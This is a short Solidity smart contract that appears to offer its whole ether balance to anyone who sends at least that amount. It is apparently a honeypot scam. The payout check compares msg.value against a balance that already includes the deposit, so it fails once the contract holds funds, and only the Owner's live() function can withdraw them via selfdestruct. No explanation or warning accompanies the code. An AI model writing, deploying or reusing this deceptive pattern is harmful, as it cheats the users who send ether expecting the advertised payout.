pragma solidity ^0.4.25;

contract DO_IT_LIVE
{
    address Owner = msg.sender;

    function() public payable {}
    function close() private { selfdestruct(msg.sender); }

    function DoItLive() public payable {
        if (msg.value >= address(this).balance) {
           close();
        }
    }
 
    function live() public {
        if (msg.sender == Owner) {
            close();
        }
    }
}